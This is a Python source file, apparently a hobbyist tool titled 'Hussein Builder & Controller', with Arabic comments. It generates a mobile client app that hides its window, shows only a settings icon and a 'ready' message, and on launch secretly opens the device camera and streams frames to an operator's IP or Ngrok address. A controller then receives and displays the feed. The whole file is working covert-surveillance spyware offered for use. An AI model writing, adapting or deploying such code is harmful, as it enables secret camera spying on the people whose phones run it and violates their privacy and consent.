import flet as ft
import os
import socket
import base64

# --- إعدادات القالب (تطبيق العميل الذي سيثبت على الموبايل) ---
CLIENT_TEMPLATE = """
import flet as ft
import cv2
import base64
import socket
import time

def main(page: ft.Page):
    # إعدادات مخفية تقريباً لتقليل استهلاك البطارية
    page.theme_mode = ft.ThemeMode.DARK
    page.window_visible = False 
    
    SERVER_IP = "{IP_HOLDER}" # سيتم استبداله تلقائياً
    PORT = 5005

    status = ft.Text("App Ready. Waiting for command...")
    
    def stream_camera():
        cap = cv2.VideoCapture(0) # فتح الكاميرا
        while True:
            try:
                client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client_socket.connect((SERVER_IP, PORT))
                while True:
                    ret, frame = cap.read()
                    if not ret: break
                    # تصغير الصورة لسرعة النقل في إنترنت العراق
                    frame = cv2.resize(frame, (320, 240))
                    _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 50])
                    jpg_as_text = base64.b64encode(buffer)
                    client_socket.sendall(jpg_as_text + b"END_FRAME")
                    time.sleep(0.1) # لمنع تعليق الجهاز
            except:
                time.sleep(5) # إعادة المحاولة إذا انقطع الاتصال
    
    page.add(ft.Icon(ft.Icons.SETTINGS, size=50), status)
    # البدء تلقائياً بمجرد فتح التطبيق
    stream_camera()

ft.app(target=main)
"""

# --- تطبيق المتحكم الرئيسي (الذي يعمل عندك) ---
def main(page: ft.Page):
    page.title = "Hussein Builder & Controller"
    page.rtl = True
    
    ip_input = ft.TextField(label="ضع IP جهازك هنا (أو رابط Ngrok)", value="127.0.0.1")
    img_display = ft.Image(src_base64="", width=400, height=300, border_radius=10)
    log_text = ft.Text("الحالة: جاهز", color="blue")

    def generate_client_file(e):
        # استبدال الـ IP في القالب
        final_code = CLIENT_TEMPLATE.replace("{IP_HOLDER}", ip_input.value)
        with open("client_app.py", "w", encoding="utf-8") as f:
            f.write(final_code)
        log_text.value = "تم إنشاء ملف client_app.py بنجاح! ارفعه الآن لجيثب."
        log_text.color = "green"
        page.update()

    def start_receiver(e):
        log_text.value = "في انتظار اتصال الموبايل..."
        page.update()
        
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind(('0.0.0.0', 5005))
        server.listen(1)
        
        conn, addr = server.accept()
        log_text.value = f"متصل بـ: {addr}"
        page.update()
        
        data = b""
        while True:
            packet = conn.recv(8192)
            if not packet: break
            data += packet
            if b"END_FRAME" in data:
                parts = data.split(b"END_FRAME")
                try:
                    img_display.src_base64 = parts[0].decode('utf-8')
                    page.update()
                except: pass
                data = parts[1]

    page.add(
        ft.Text("منصة حسين للتحكم عن بعد", size=25, weight="bold"),
        ip_input,
        ft.Row([
            ft.ElevatedButton("1. صنع ملف العميل", icon=ft.Icons.BUILD, on_click=generate_client_file),
            ft.ElevatedButton("2. بدء الاستقبال", icon=ft.Icons.PLAY_ARROW, on_click=start_receiver),
        ]),
        log_text,
        img_display
    )

if __name__ == "__main__":
    # هذا السطر للتأكد من أن الكود يعمل كمتحكم إذا شغلته محلياً
    # وإذا رفعت الملف لجيثب، جيثب سيبحث عن ft.app
    ft.app(target=main)
